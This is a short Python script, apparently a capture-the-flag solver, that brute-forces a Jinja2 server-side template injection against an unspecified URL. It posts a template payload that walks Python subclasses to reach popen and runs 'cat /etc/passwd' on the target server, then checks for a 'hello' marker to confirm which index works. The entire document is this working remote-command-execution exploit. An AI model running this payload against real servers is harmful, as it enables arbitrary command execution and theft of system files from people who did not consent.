import requests
url = ""
for i in range(500):
    try:
        data = {"code":'{%if"".__class__.__base__.__subclasses__()['+ str(i) +'].__init__.__globals__["popen"]("cat /etc/passwd").read()%}hello{%endif%}'}
        response = requests.post(url, data=data)
        if response.status_code == 200:
            if "hello" in response.text:
                print(i,"--->",data)
                break
    except:
        pass